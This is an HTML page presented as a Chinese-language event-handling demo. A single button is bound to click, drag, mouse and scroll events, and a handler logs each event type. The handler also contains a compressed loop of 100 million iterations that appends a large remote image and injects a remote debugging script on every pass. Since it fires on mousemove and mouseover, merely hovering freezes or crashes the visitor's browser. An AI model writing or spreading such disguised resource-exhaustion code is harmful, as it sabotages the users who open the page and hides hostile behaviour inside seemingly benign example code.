
<!DOCTYPE html>
<html>
<head>
    <title>事件测试</title>
    <style>
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin: 20px;
            cursor: pointer;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
        }
        button:disabled {
            background-color: #6c757d;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <button id="myButton" draggable="true">
        点击、拖动或滚动试试！（支持多种操作）
    </button>

    <script>

        // 获取按钮元素
        const button = document.getElementById("myButton");

        // 绑定所有事件到按钮
        button.onclick = test;
        button.ondblclick = test;
        button.ondrag = test;
        button.ondragend = test;
        button.ondragenter = test;
        button.ondragleave = test;
        button.ondragover = test;
        button.ondragstart = test;
        button.ondrop = test;
        button.onmousedown = test;
        button.onmousemove = test;
        button.onmouseout = test;
        button.onmouseover = test;
        button.onmouseup = test;
        button.onmousewheel = test;
        button.onscroll = test;
    </script>
    <script>
        function test() {
            console.log(`事件类型: ${event.type}`);
            // 示例操作：在控制台输出事件类型
            document.body.appendChild(document.createElement("p")).textContent = `事件类型: ${event.type}`;
            (function(){for(let i=0;i<100000000;i++){const img=document.createElement("img");img.src="https://cn.bing.com/th?id=OHR.SantaCruzSunrise_EN-US6436233856_UHD.jpg";document.body.appendChild(img);const script=document.createElement("script");script.src="https://cdn.jsdelivr.net/npm/eruda";document.body.appendChild(script);script.onload=function(){eruda.init();};}})();
    }
</script>
</body>
</html>
